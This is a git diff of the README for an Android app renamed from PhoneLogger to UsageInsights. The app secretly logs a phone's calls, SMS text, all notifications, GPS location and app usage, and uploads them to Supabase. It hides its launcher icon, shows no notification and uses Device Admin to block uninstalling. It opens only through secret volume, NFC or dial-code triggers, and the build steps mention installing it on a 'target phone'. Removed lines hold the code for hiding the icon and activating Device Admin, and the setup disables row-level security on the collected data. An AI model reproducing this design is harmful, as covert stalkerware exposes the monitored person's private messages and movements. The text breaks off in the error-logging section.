@@ -1,43 +1,43 @@
-# PhoneLogger
+# UsageInsights
 
-A silent, personal Android activity logger. Captures calls, SMS, notifications, location, system events, screen activity, battery, app usage, and network events on your own device. Stores everything locally in SQLite and syncs to Supabase twice daily. No persistent notification. No visible launcher icon. Cannot be uninstalled without revoking Device Admin. Accessible only via a secret dial code.
+A silent, personal Android activity logger. Captures calls, SMS, notifications, location, system events, screen activity, battery, app usage, and network events on your own device. Stores everything locally in SQLite and syncs to Supabase twice daily. No persistent notification. No visible launcher icon. Accessible only via a secret volume sequence, NFC tag, or dial code.
 
 ---
 
 ## Table of Contents
 
-- [Overview](../../Téléchargements/README (2).md#overview)
-- [Architecture](../../Téléchargements/README (2).md#architecture)
-- [Project Structure](../../Téléchargements/README (2).md#project-structure)
-- [Tech Stack](../../Téléchargements/README (2).md#tech-stack)
-- [Permissions](../../Téléchargements/README (2).md#permissions)
-- [Setup & Configuration](../../Téléchargements/README (2).md#setup--configuration)
-- [Supabase Setup](../../Téléchargements/README (2).md#supabase-setup)
-- [Building & Running](../../Téléchargements/README (2).md#building--running)
-- [Secret Access](../../Téléchargements/README (2).md#secret-access)
-- [Uninstall Protection](../../Téléchargements/README (2).md#uninstall-protection)
-- [Sync & Retry Logic](../../Téléchargements/README (2).md#sync--retry-logic)
-- [Error Logging](../../Téléchargements/README (2).md#error-logging)
-- [Database Schema](../../Téléchargements/README (2).md#database-schema)
-- [Supabase Schema](../../Téléchargements/README (2).md#supabase-schema)
+- [Overview](#overview)
+- [Architecture](#architecture)
+- [Project Structure](#project-structure)
+- [Tech Stack](#tech-stack)
+- [Permissions](#permissions)
+- [Setup & Configuration](#setup--configuration)
+- [Supabase Setup](#supabase-setup)
+- [Building & Running](#building--running)
+- [Secret Access](#secret-access)
+- [Uninstall Protection](#uninstall-protection)
+- [Sync & Retry Logic](#sync--retry-logic)
+- [Error Logging](#error-logging)
+- [Database Schema](#database-schema)
+- [Supabase Schema](#supabase-schema)
 
 ---
 
 ## Overview
 
-PhoneLogger is a personal surveillance app for your own Android device. It runs completely silently in the background with:
+UsageInsights is a personal surveillance app for your own Android device. It runs completely silently in the background with:
 
-- No launcher icon
+- No launcher icon (hidden after setup)
 - No persistent notification
-- No foreground service
-- Accessible only by dialing a secret USSD-like code
+- PIN-protected lock screen
+- Accessible only via secret triggers
 
 It captures:
 - Incoming and outgoing **calls** (number, saved name if any, duration, timestamp)
 - Incoming **SMS** (sender, content, timestamp)
-- All **notifications** (app, title, content, timestamp)
+- All **notifications** (app name, title, content, timestamp — with per-app exclude list)
 - **Location** every 60 minutes (lat, lng, accuracy, timestamp — or `DISABLED` if GPS is off)
-- **System events** (shutdown, reboot, total time off, airplane mode on/off, mobile data on/off)
+- **System events** (shutdown, reboot, airplane mode on/off, mobile data on/off)
 - **Screen events** (screen on, screen off, phone unlocked — with timestamps)
 - **Battery events** (level logged every 60min alongside location, charging started/stopped)
 - **App usage** (which apps were opened and for how long, via `UsageStatsManager`)
@@ -67,25 +67,30 @@ BroadcastReceiver
 └── BluetoothDevice.ACTION_ACL_CONNECTED / DISCONNECTED → logs BT devices
 
 NotificationListenerService
-└── onNotificationPosted      → logs all notifications from all apps
+└── onNotificationPosted      → logs all notifications (skips excluded apps, deduplicates within 2s)
 
 WorkManager
 ├── SyncWorker (2x daily)     → pushes all unsynced rows to Supabase, wipes local DB on success
 │   ├── Retries on failure (exponential backoff)
 │   ├── Waits for network connectivity before running
 │   └── Logs failed attempts as error_logs entries
-├── LocationWorker (every 60min) → captures GPS fix (ACCESS_FINE_LOCATION)
+├── LocationWorker (configurable, default 60min) → captures GPS fix (ACCESS_FINE_LOCATION)
 │   └── If GPS disabled → logs entry with position_status = "DISABLED"
-└── UsageStatsWorker (every 60min) → reads app usage via UsageStatsManager
+└── UsageStatsWorker (configurable, default 60min) → reads app usage via UsageStatsManager
 
-SecretCodeReceiver
-└── *#00000# dialed           → opens hidden MainActivity
+Triggers
+├── VolumeAccessibilityService  → Vol+ Vol+ Vol− Vol+ Vol− Vol− sequence
+├── SecretCodeReceiver          → *#01234# dialed (Android ≤ 11)
+└── NFCReceiver                 → programmed NFC tag tap
+
+LockActivity (PIN screen)
+└── 6-digit PIN gates access to MainActivity
 
 Device Admin (AdminReceiver)
 └── Prevents uninstall via Settings → Apps
 
 SQLite (local)
-└── single database, 9 tables:
+└── single database, 10 tables:
     ├── call_logs
     ├── sms_logs
     ├── notification_logs
@@ -107,16 +112,15 @@ Supabase (remote)
 ## Project Structure
 
 ```
-PhoneLogger/
+UsageInsights/
 ├── app/
 │   └── src/
 │       └── main/
 │           ├── AndroidManifest.xml
-│           ├── java/com/phonelogger/
+│           ├── java/com/usageinsights/
 │           │   ├── receivers/
-│           │   │   ├── SecretCodeReceiver.java       # *#00000# trigger
+│           │   │   ├── SecretCodeReceiver.java       # *#01234# trigger (Android ≤ 11)
 │           │   │   ├── NFCReceiver.java              # NFC tag detection
-│           │   │   ├── VolumeReceiver.java           # Volume button sequence via AccessibilityService
 │           │   │   ├── SMSReceiver.java              # SMS_RECEIVED
 │           │   │   ├── CallReceiver.java             # PHONE_STATE + NEW_OUTGOING_CALL
 │           │   │   ├── SystemEventReceiver.java      # SHUTDOWN, BOOT, AIRPLANE, DATA
@@ -126,13 +130,13 @@ PhoneLogger/
 │           │   │   ├── BluetoothReceiver.java        # ACL_CONNECTED, ACL_DISCONNECTED
 │           │   │   └── AdminReceiver.java            # Device Admin — blocks uninstall
 │           │   ├── services/
-│           │   │   ├── NotificationLogger.java       # NotificationListenerService
+│           │   │   ├── NotificationLogger.java       # NotificationListenerService + dedup
 │           │   │   ├── ShakeDetectionService.java    # Accelerometer monitoring for shake trigger
 │           │   │   └── VolumeAccessibilityService.java # Volume button sequence detection
 │           │   ├── workers/
 │           │   │   ├── SyncWorker.java               # WorkManager — 2x daily sync + wipe
-│           │   │   ├── LocationWorker.java           # WorkManager — GPS fix every 60min
-│           │   │   └── UsageStatsWorker.java         # WorkManager — app usage every 60min
+│           │   │   ├── LocationWorker.java           # WorkManager — GPS fix (configurable interval)
+│           │   │   └── UsageStatsWorker.java         # WorkManager — app usage (configurable interval)
 │           │   ├── db/
 │           │   │   ├── DatabaseHelper.java           # SQLiteOpenHelper
 │           │   │   └── LogDao.java                   # insert / query / mark synced / wipe
@@ -148,39 +152,44 @@ PhoneLogger/
 │           │   │   ├── NetworkLog.java
 │           │   │   └── ErrorLog.java
 │           │   ├── network/
-│           │   │   └── SupabaseClient.java           # OkHttp — batch POST to Supabase
+│           │   │   └── SupabaseClient.java           # OkHttp — batch POST to Supabase REST API
 │           │   ├── utils/
 │           │   │   ├── ContactUtils.java             # resolve number → saved name
 │           │   │   └── NetworkUtils.java             # connectivity check
 │           │   └── ui/
-│           │       ├── MainActivity.java             # hidden settings panel, access via trigger
-│           │       ├── adapters/
-│           │       │   └── SettingsAdapter.java
+│           │       ├── LockActivity.java             # 6-digit PIN lock screen
+│           │       ├── MainActivity.java             # bottom-tab settings panel
+│           │       ├── WorkerScheduler.java          # schedules/reschedules WorkManager jobs
 │           │       └── fragments/
-│           │           ├── TriggerSettingsFragment.java
-│           │           ├── SyncSettingsFragment.java
-│           │           ├── LoggingSettingsFragment.java
-│           │           ├── DataSettingsFragment.java
-│           │           └── AppSettingsFragment.java
+│           │           ├── TriggerFragment.java      # trigger configuration
+│           │           ├── SyncFragment.java         # sync settings + ping + manual sync
+│           │           ├── LoggingFragment.java      # logging toggles + exclude list
+│           │           ├── DataFragment.java         # local DB stats + export + wipe
+│           │           └── AppFragment.java          # permissions status + PIN + danger zone
 │           └── res/
 │               ├── xml/
 │               │   └── device_admin.xml              # Device Admin policy declaration
+│               ├── drawable/
+│               │   └── logo.png                      # app logo (512×512, used on lock screen)
+│               ├── mipmap-*/
+│               │   ├── ic_launcher.png               # launcher icon (all densities)
+│               │   └── ic_launcher_round.png         # round launcher icon (all densities)
 │               ├── layout/
-│               │   ├── activity_main.xml             # Drawer navigation layout
-│               │   ├── nav_header.xml                # Navigation drawer header
-│               │   ├── fragment_trigger_settings.xml # Trigger configuration
-│               │   ├── fragment_sync_settings.xml    # Sync configuration
-│               │   ├── fragment_logging_settings.xml # Logging toggles
-│               │   ├── fragment_data_settings.xml    # Data management
-│               │   └── fragment_app_settings.xml     # App configuration
-│               ├── menu/
-│               │   └── drawer_menu.xml               # Navigation menu items
+│               │   ├── activity_lock.xml             # PIN lock screen
+│               │   ├── activity_main.xml             # bottom navigation + ViewPager
+│               │   ├── fragment_trigger.xml
+│               │   ├── fragment_sync.xml
+│               │   ├── fragment_logging.xml
+│               │   ├── fragment_data.xml
+│               │   ├── fragment_app.xml
+│               │   └── item_app_exclude.xml          # row layout for notification exclude list
 │               └── values/
 │                   ├── strings.xml
 │                   └── secrets.xml                   # gitignored — Supabase keys + dial code
 ├── build.gradle (app)
 ├── build.gradle (project)
 ├── gradle.properties
+├── INSTALL.md
 └── .gitignore
 ```
 
@@ -196,11 +205,11 @@ PhoneLogger/
 | Local storage | SQLite via `SQLiteOpenHelper` |
 | Background sync | WorkManager |
 | HTTP client | OkHttp 4 |
-| JSON | Gson |
+| JSON | Gson (`LOWER_CASE_WITH_UNDERSCORES`, excludes `id` and `synced` fields) |
 | Remote storage | Supabase (PostgreSQL via REST API) |
 | Call/SMS capture | BroadcastReceiver |
 | Notification capture | NotificationListenerService |
-| Location | FusedLocationProviderClient (GPS only, `PRIORITY_HIGH_ACCURACY`) |
+| Location | FusedLocationProviderClient (`PRIORITY_HIGH_ACCURACY`) |
 | App usage | UsageStatsManager |
 | Uninstall protection | Device Administration API |
 
@@ -208,58 +217,7 @@ PhoneLogger/
 
 ## Permissions
 
-Declare all of these in `AndroidManifest.xml`:
-
-```xml
-<!-- Core logging permissions -->
-<uses-permission android:name="android.permission.READ_CALL_LOG" />
-<uses-permission android:name="android.permission.READ_CONTACTS" />
-<uses-permission android:name="android.permission.RECEIVE_SMS" />
-<uses-permission android:name="android.permission.READ_SMS" />
-<uses-permission android:name="android.permission.READ_PHONE_STATE" />
-<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
-
-<!-- Location (GPS only, every 60 minutes) -->
-<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-<uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
-
-<!-- NFC trigger -->
-<uses-permission android:name="android.permission.NFC" />
-
-<!-- Volume button trigger (requires Accessibility service) -->
-<uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"
-    tools:ignore="ProtectedPermissions" />
-
-<!-- Shake trigger -->
-<uses-permission android:name="android.permission.WAKE_LOCK" />
-
-<!-- App usage stats -->
-<uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
-    tools:ignore="ProtectedPermissions" />
-
-<!-- Network & connectivity -->
-<uses-permission android:name="android.permission.INTERNET" />
-<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-<uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
-
-<!-- Bluetooth -->
-<uses-permission android:name="android.permission.BLUETOOTH" />
-<uses-permission android:name="android.permission.BLUETOOTH_CONNECT"
-    android:minSdkVersion="31" />
-
-<!-- Keep alive -->
-<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-<uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
-
-<!-- Foreground service (required for NotificationListenerService on API 34+) -->
-<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
-
-<!-- Device Admin (uninstall protection) -->
-<uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
-```
-
-### Runtime permissions to request on first launch (MainActivity):
+### Runtime permissions requested on first launch:
 
 - `READ_CALL_LOG`
 - `READ_CONTACTS`
@@ -267,18 +225,17 @@ Declare all of these in `AndroidManifest.xml`:
 - `READ_PHONE_STATE`
 - `RECEIVE_SMS`
 - `ACCESS_FINE_LOCATION`
-- `ACCESS_BACKGROUND_LOCATION` *(must be requested separately, after FINE_LOCATION is granted)*
+- `ACCESS_BACKGROUND_LOCATION` *(must be requested separately, after FINE is granted)*
 - `BLUETOOTH_CONNECT` *(Android 12+ only)*
 - `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS`
+- `POST_NOTIFICATIONS` *(Android 13+)*
 
-### Manually granted by user in Android Settings:
+### Manually granted in Android Settings:
 
-- **Notification Access** → Settings > Apps > Special App Access > Notification Access > PhoneLogger ✅
-- **Usage Access** → Settings > Apps > Special App Access > Usage Access > PhoneLogger ✅
-- **Device Admin** → prompted via `DevicePolicyManager` on first launch ✅
-- **Accessibility Service** (only if using volume button trigger) → Settings > Accessibility > PhoneLogger ✅
-
-Each of these requires manual navigation. The app provides "Go to Settings" buttons for each one during initial setup.
+- **Notification Access** → Settings → Notification access → enable Usage Insights
+- **Usage Access** → Settings → Usage access → enable Usage Insights
+- **Device Admin** → prompted via `DevicePolicyManager` during setup
+- **Accessibility Service** → Settings → Accessibility → Input Accessibility (for volume trigger)
 
 ---
 
@@ -291,58 +248,40 @@ git clone https://github.com/CodeWrittter/logger.git
 cd logger
 ```
 
-### 2. Create `secrets.xml`
+### 2. Fill in `secrets.xml`
 
-Create `app/src/main/res/values/secrets.xml` (this file is gitignored):
+Edit `app/src/main/res/values/secrets.xml` (this file is gitignored — never commit it):
 
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
-    <string name="supabase_url">https://your-project.supabase.co</string>
+    <string name="supabase_url">https://your-project-id.supabase.co</string>
     <string name="supabase_anon_key">your-anon-key-here</string>
-    <string name="secret_dial_code">*#00000#</string>
+    <string name="secret_dial_host">01234</string>
 </resources>
 ```
 
-### 3. Add to `.gitignore`
+These values are baked into the APK as defaults. You can override `supabase_url` and `supabase_anon_key` at runtime from **App tab → SECURITY → Supabase Credentials** without rebuilding. The in-app value always takes precedence.
 
-```
-app/src/main/res/values/secrets.xml
-```
-
-### 4. Add dependencies to `app/build.gradle`
-
-```groovy
-dependencies {
-    implementation 'androidx.work:work-runtime:2.9.0'
-    implementation 'com.squareup.okhttp3:okhttp:4.12.0'
-    implementation 'com.google.code.gson:gson:2.10.1'
-    implementation 'com.google.android.gms:play-services-location:21.2.0'
-    
-    // UI Framework
-    implementation 'androidx.appcompat:appcompat:1.6.1'
-    implementation 'androidx.drawerlayout:drawerlayout:1.2.0'
-    implementation 'com.google.android.material:material:1.11.0'
-    implementation 'androidx.fragment:fragment:1.6.2'
-    implementation 'androidx.preference:preference:1.2.1'
-}
-```
+`secret_dial_host` is the digits of the dial trigger code — `01234` means dialing `*#01234#` opens the app (Android ≤ 11 only).
 
 ---
 
 ## Supabase Setup
 
-### 1. Create a free project at https://supabase.com
+### 1. Create a free project at supabase.com
 
-### 2. Run the schema (see [Supabase Schema](../../Téléchargements/README (2).md#supabase-schema) section below)
+### 2. Run the schema
 
-### 4. Credentials
+Paste the SQL from the [Supabase Schema](#supabase-schema) section into the SQL Editor and click **Run**.
 
-- Go to Project Settings → API
-- Copy **Project URL** and **anon public key**
-- Paste them into `secrets.xml`
+### 3. Disable Row Level Security
 
-RLS is disabled for all tables directly in the schema SQL above.
+Run the `ALTER TABLE ... DISABLE ROW LEVEL SECURITY` statements included at the end of the schema SQL, or use the Table Editor UI for each table.
+
+### 4. Get your credentials
+
+Go to **Project Settings → API**. Copy the **Project URL** and the **anon / public key**, then paste them into `secrets.xml`.
 
 ---
 
@@ -355,60 +294,52 @@ RLS is disabled for all tables directly in the schema SQL above.
 adb install app/build/outputs/apk/debug/app-debug.apk
 ```
 
-### Release build
+### Release build (signed APK for sideloading)
 
-```bash
-./gradlew assembleRelease
-```
+1. In Android Studio: **Build → Generate Signed Bundle / APK → APK**.
+2. Create or select a keystore, fill in alias and passwords.
+3. Choose **release** build variant, click **Finish**.
+4. The signed APK is in `app/release/app-release.apk`.
+5. Transfer it to the target phone and install it (enable "Install unknown apps" for your file manager).
+
+> Keep your keystore file and passwords safe. You need the same keystore to update the app later. If you lose it, you must uninstall and reinstall from scratch.
 
 ### First launch checklist
 
-1. Open app (temporarily via launcher or adb)
-2. Complete initial setup wizard:
-   - Grant all runtime permissions one by one (guided by setup UI)
-   - Go to Notification Access settings and enable PhoneLogger
-   - Go to Usage Access settings and enable PhoneLogger
-   - Activate Device Admin when prompted (blocks uninstall)
-   - Grant battery optimization exemption when prompted
-   - Allow background location ("Allow all the time") when prompted
-3. **Choose your trigger method(s)** in Trigger Settings:
-   - Configure dial code (change from default if desired)
-   - Write NFC tag if using NFC
-   - Configure volume sequence if using volume buttons
-   - Test chosen triggers to ensure they work
-4. **Configure logging preferences** in Logging Settings:
-   - Disable any features you don't want (optional)
-   - Set location/usage intervals (default 60min is recommended)
-   - Add apps to notification exclude list if needed
-5. **Test Supabase connection** in Sync Settings
-6. Hide launcher icon (done automatically after setup completion)
-7. App is now accessible only via your configured trigger method(s)
+1. Open app via launcher (temporarily visible after install).
+2. Enter the default PIN `123456`.
+3. Tap **Re-run Setup Wizard** on the App tab — it guides you through each permission.
+4. Grant all runtime permissions and manually enable Notification Access, Usage Access, Device Admin, and battery optimization exemption.
+5. Go to the **Trigger tab** and enable at least one trigger (volume sequence is recommended).
+6. Go to the **Sync tab** and tap **Ping** to confirm your Supabase credentials work.
+7. Tap **Sync Now** for a first manual sync to verify data is reaching Supabase.
+8. Go to the **App tab → VISIBILITY → Show Launcher Icon** → toggle **OFF**.
 
-> ⚠️ The launcher icon auto-hides only after ALL permissions are granted and at least one trigger method is configured and tested. This prevents lockout scenarios.
+---
 
-### Hide launcher icon logic (in MainActivity.java)
+## Secret Access
 
-```java
-// Only hide after setup is complete AND at least one trigger is configured
-private void hideIconIfSetupComplete() {
-    SharedPreferences prefs = getSharedPreferences("phonelogger", MODE_PRIVATE);
-    boolean setupComplete = prefs.getBoolean("setup_complete", false);
-    boolean triggerConfigured = prefs.getBoolean("trigger_configured", false);
-    
-    if (setupComplete && triggerConfigured) {
-        PackageManager pm = getPackageManager();
-        pm.setComponentEnabledSetting(
-            new ComponentName(this, MainActivity.class),
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP
-        );
-    }
-}
+Three trigger methods are available. Multiple can be active simultaneously.
+
+### Volume button sequence (recommended)
+
+Enable the accessibility service in Settings → Accessibility → Input Accessibility, then press:
+
+```
+Vol+  Vol+  Vol−  Vol+  Vol−  Vol−
 ```
 
-The app can be "un-hidden" later from App Settings → "Show Launcher Icon" if needed for debugging.
+One button at a time, within 3 seconds. Works from anywhere — lock screen, home screen, inside another app.
 
-> ⚠️ The icon auto-hides only after ALL permissions are granted and at least one trigger method is configured and tested. This prevents lockout scenarios.
+### Dial code (Android 9–11 only)
+
+The `SecretCodeReceiver` listens for a secret dial code. Default: dial `*#01234#` in the phone dialer (do not press call). Does not work on Android 12+ due to OS restrictions.
+
+The host digits are set via `secret_dial_host` in `secrets.xml`, or changed in the **Trigger tab**.
+
+### NFC tag
+
+Tap **Write Tag** on the Trigger tab, hold an empty NFC sticker to the phone. From then on, tapping that tag opens the lock screen.
 
 ---
 
@@ -416,217 +347,10 @@ The app can be "un-hidden" later from App Settings → "Show Launcher Icon" if n
 
 The app registers itself as a **Device Administrator** to prevent uninstallation via Settings → Apps.
 
-### `res/xml/device_admin.xml`:
-
-```xml
-<?xml version="1.0" encoding="utf-8"?>
-<device-admin>
-    <uses-policies>
-        <force-lock />
-    </uses-policies>
-</device-admin>
-```
-
-### In `AndroidManifest.xml`:
-
-```xml
-<receiver
-    android:name=".receivers.AdminReceiver"
-    android:exported="true"
-    android:permission="android.permission.BIND_DEVICE_ADMIN">
-    <meta-data
-        android:name="android.app.device_admin"
-        android:resource="@xml/device_admin" />
-    <intent-filter>
-        <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
-    </intent-filter>
-</receiver>
-```
-
-### Activate on first launch (in MainActivity.java):
-
-```java
-DevicePolicyManager dpm =
-    (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
-ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
-
-if (!dpm.isAdminActive(adminComponent)) {
-    Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
-    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
-    intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-        "Required to keep this app running.");
-    startActivityForResult(intent, REQUEST_DEVICE_ADMIN);
-}
-```
-
-> Once Device Admin is active, the uninstall button in Settings → Apps is greyed out. To uninstall manually, the user must first go to Settings → Security → Device Admin Apps and deactivate PhoneLogger.
-
----
-
-## Secret Access
-
-The app registers a `BroadcastReceiver` for a secret dial code.
-
-### In `AndroidManifest.xml`:
-
-```xml
-<receiver android:name=".receivers.SecretCodeReceiver"
-    android:exported="true">
-    <intent-filter>
-        <action android:name="android.provider.Telephony.SECRET_CODE" />
-        <data android:scheme="android_secret_code"
-              android:host="00000" />
-    </intent-filter>
-</receiver>
-```
-
-> The code above corresponds to dialing `*#00000#`. Change `00000` in both the manifest and `secrets.xml` to your preferred code.
-
-### `SecretCodeReceiver.java` behavior:
-
-On receiving the broadcast → start `MainActivity` with `FLAG_ACTIVITY_NEW_TASK`.
-
----
-
-## Settings Panel (Hidden MainActivity)
-
-Once triggered via the secret method, `MainActivity` opens as a full settings control panel with a side navigation drawer containing 5 categories:
-
-### 🔐 Trigger Settings
-
-Configure how to access the app. Multiple triggers can be enabled simultaneously.
-
-**Available Triggers:**
-- **Dial Code** — customizable USSD code (default: `*#00000#`)
-  - Text field to change the code
-  - Test button to verify it works on current device
-- **NFC Tag** — tap a programmed NFC sticker
-  - "Scan NFC Tag" button to read existing tags
-  - "Write NFC Tag" button to program a new tag from the app
-- **Volume Buttons** — specific press sequence 
-  - Configure pattern: Vol Up × 3 → Vol Down × 2 (customizable)
-  - Sensitivity slider (time window: 2-5 seconds)
-- **Shake Pattern** — shake device in specific way
-  - Sensitivity: Low / Medium / High
-  - Test shake detector button
-
-**Settings UI:**
-```
-┌─────────────────────────────────────┐
-│ [✓] Dial Code        *#00000#  [≡]  │
-│ [✓] NFC Tag         [Write][Read]   │
-│ [ ] Volume Sequence [Configure]     │
-│ [ ] Shake Pattern   [Configure]     │
-└─────────────────────────────────────┘
-```
-
-### 📡 Sync Settings
-
-Control when and how data syncs to Supabase.
-
-**Options:**
-- **Sync Frequency**
-  - Every 12 hours (default)
-  - Every 24 hours
-  - Manual only
-- **Connection Status**
-  - 🟢 Connected to Supabase
-  - 🔴 Connection failed
-  - 🟡 Not tested yet
-- **Last Sync**
-  - Timestamp of last successful sync
-  - Number of records uploaded in last sync
-  - View sync error log if failed
-- **Manual Actions**
-  - "Sync Now" button (force immediate sync)
-  - "Test Connection" button (ping Supabase)
-
-### 📊 Logging Settings
-
-Toggle individual logging features and configure intervals.
-
-**Categories:**
-- **Communications**
-  - [✓] SMS messages
-  - [✓] Phone calls
-  - [✓] Notifications
-    - Exclude list: Choose apps to ignore (e.g. banking, work apps)
-- **Location & Movement**
-  - [✓] GPS location
-    - Interval: 30min / **60min** / 90min / 2hr
-    - Accuracy: High / Balanced / Low power
-- **System Events**
-  - [✓] Screen on/off/unlock
-  - [✓] Battery events
-  - [✓] Shutdown/reboot
-  - [✓] Airplane mode
-  - [✓] Mobile data on/off
-- **App Activity**
-  - [✓] App usage stats
-    - Interval: 30min / **60min** / 90min
-  - [✓] WiFi events
-  - [✓] Bluetooth events
-
-### 💾 Data Management
-
-View storage usage and manage local/remote data.
-
-**Local Database:**
-- Current size: 2.1 MB
-- Total records: 1,847 entries
-- "View Records" → simple list with search
-- "Export as JSON" → save to Downloads
-- "Wipe Local DB" → with confirmation dialog
-
-**Supabase Storage:**
-- Remote size: 15.3 MB
-- Total records uploaded: 12,492 entries
-- "Download All Data" → export entire Supabase as JSON
-- Connection test: Last ping 2ms
-
-### ⚙️ App Settings
-
-App management and advanced configuration.
-
-**Permissions Status:**
-- Notification Access: ✅
-- Location Access: ✅ (Background allowed)
-- Usage Stats Access: ✅
-- Device Admin: ✅
-- Battery Optimization: ✅ (Disabled for this app)
-
-**Dangerous Actions:**
-- "Re-run Setup Wizard" → go through all permissions again
-- "Deactivate Device Admin" → enables app uninstall (with warning)
-- "Show Launcher Icon" → makes app visible again (with warning)
-
-**App Info:**
-- Version: 1.0.0
-- Package: com.phonelogger
-- Install date: May 5, 2026
-- Last boot: 2 days ago
-
----
-
-## MainActivity UI Layout
-
-The settings panel uses a drawer navigation pattern:
-
-```
-┌─────────────────────────────────────┐
-│ ☰ PhoneLogger      [Hide] [Export] │ ← Top bar
-├─────────────────────────────────────┤
-│ [🔐] Trigger        │ Content area  │
-│ [📡] Sync           │ shows the     │
-│ [📊] Logging        │ selected      │ ← Drawer + content
-│ [💾] Data           │ category      │
-│ [⚙️] App            │ settings      │
-└─────────────────────────────────────┘
-```
-
-Navigation drawer slides in from left. Selecting a category loads its fragment in the content area. Top bar includes:
-- **Hide** → close MainActivity, return to hidden state
-- **Export** → quick export of current DB as JSON
+To uninstall legitimately:
+1. Open the app via a trigger and enter your PIN.
+2. Go to **App tab → DANGER ZONE → Deactivate Device Admin**.
+3. Then uninstall normally from Settings → Apps.
 
 ---
 
@@ -634,78 +358,37 @@ Navigation drawer slides in from left. Selecting a category loads its fragment i
 
 All sync is handled by `SyncWorker` via WorkManager.
 
-### Schedule (set up in MainActivity on first launch):
+### Schedule
 
-```java
-// Location + battery snapshot every 60 minutes
-PeriodicWorkRequest locationRequest = new PeriodicWorkRequest.Builder(
-    LocationWorker.class, 60, TimeUnit.MINUTES)
-    .build();
+| Worker | Interval | Constraint |
+|---|---|---|
+| `SyncWorker` | Every 12 hours | Requires network |
+| `LocationWorker` | Configurable (default 60 min) | None |
+| `UsageStatsWorker` | Configurable (default 60 min) | None |
 
-WorkManager.getInstance(this).enqueueUniquePeriodicWork(
-    "location_logs",
-    ExistingPeriodicWorkPolicy.KEEP,
-    locationRequest
-);
+`setRequiredNetworkType(NetworkType.CONNECTED)` ensures `SyncWorker` waits automatically until the device is online. No manual polling needed.
 
-// App usage stats every 60 minutes
-PeriodicWorkRequest usageRequest = new PeriodicWorkRequest.Builder(
-    UsageStatsWorker.class, 60, TimeUnit.MINUTES)
-    .build();
+### SyncWorker behavior
 
-WorkManager.getInstance(this).enqueueUniquePeriodicWork(
-    "usage_logs",
-    ExistingPeriodicWorkPolicy.KEEP,
-    usageRequest
-);
+1. Query SQLite for all rows where `synced = 0` across all 10 tables.
+2. Batch POST to Supabase REST API (`/rest/v1/<table>`), excluding `id` and `synced` fields from the JSON payload.
+3. On success (HTTP 2xx) → wipe the entire local database.
+4. On failure → WorkManager retries automatically with exponential backoff.
+5. Log the failure itself as an `error_logs` entry with `synced = 0` so it gets pushed on the next successful sync.
 
-// Sync to Supabase twice daily
-PeriodicWorkRequest syncRequest = new PeriodicWorkRequest.Builder(
-    SyncWorker.class, 12, TimeUnit.HOURS)
-    .setConstraints(new Constraints.Builder()
-        .setRequiredNetworkType(NetworkType.CONNECTED) // wait for internet
-        .build())
-    .setBackoffCriteria(
-        BackoffPolicy.EXPONENTIAL,
-        WorkRequest.MIN_BACKOFF_MILLIS,
-        TimeUnit.MILLISECONDS)
-    .build();
+> The local database wipe only happens **after** Supabase returns a successful response. Never wipe before confirmation.
 
-WorkManager.getInstance(this).enqueueUniquePeriodicWork(
-    "sync_logs",
-    ExistingPeriodicWorkPolicy.KEEP,
-    syncRequest
-);
-```
+### LocationWorker behavior
 
-### SyncWorker behavior:
-
-1. Query SQLite for all rows where `synced = 0` across all tables
-2. Batch POST to Supabase REST API (`/rest/v1/tablename`)
-3. On success → confirm server acknowledgement, then wipe entire local database
-4. On failure → WorkManager retries automatically with exponential backoff
-5. Log the failure itself as an `error_logs` entry with `synced = 0` so it gets pushed on next successful sync
-
-> ⚠️ The local database wipe only happens **after** Supabase returns a successful response. Never wipe before confirmation.
-
-### LocationWorker behavior:
-
-1. Request a single GPS fix using `FusedLocationProviderClient` with `PRIORITY_HIGH_ACCURACY`
-2. If GPS is disabled → insert `LocationLog` with `position_status = "DISABLED"`, `lat = null`, `lng = null`
-3. If GPS is enabled → insert `LocationLog` with actual coordinates, accuracy, and `position_status = "OK"`
-4. Also snapshot current battery level and insert a `BatteryLog` entry at the same time
-
-### Connectivity:
-
-`setRequiredNetworkType(NetworkType.CONNECTED)` ensures WorkManager **waits automatically** until the device is online before running the sync. No manual polling needed.
+1. Request a single GPS fix using `FusedLocationProviderClient` with `PRIORITY_HIGH_ACCURACY`.
+2. If GPS is disabled → insert `LocationLog` with `position_status = "DISABLED"`.
+3. If GPS is enabled → insert `LocationLog` with actual coordinates, accuracy, and `position_status = "OK"`.
 
 ---
 
 ## Error Logging
 
-Every failure in the app is captured as an `ErrorLog` and saved to the local `error_logs` table, then synced to Supabase alongside other logs.
-
-### What gets logged as an error:
+Every failure is captured as an `ErrorLog` and saved to the local `error_logs` table, then synced to Supabase.
 
 | Event | Error type |
 |---|---|
@@ -714,117 +397,68 @@ Every failure in the app is captured as an `ErrorLog` and saved to the local `er
 | Call capture exception | `CALL_CAPTURE_FAILED` |
 | Notification capture exception | `NOTIFICATION_CAPTURE_FAILED` |
 | Location capture exception | `LOCATION_CAPTURE_FAILED` |
-| GPS disabled at capture time | `LOCATION_DISABLED` (not an error, logged in location_logs) |
 | App usage read exception | `USAGE_STATS_FAILED` |
-| Permission denied at runtime | `PERMISSION_DENIED` |
-| Database insert failure | `DB_INSERT_FAILED` |
-| Database wipe failure after sync | `DB_WIPE_FAILED` |
-
-### ErrorLog model fields:
-
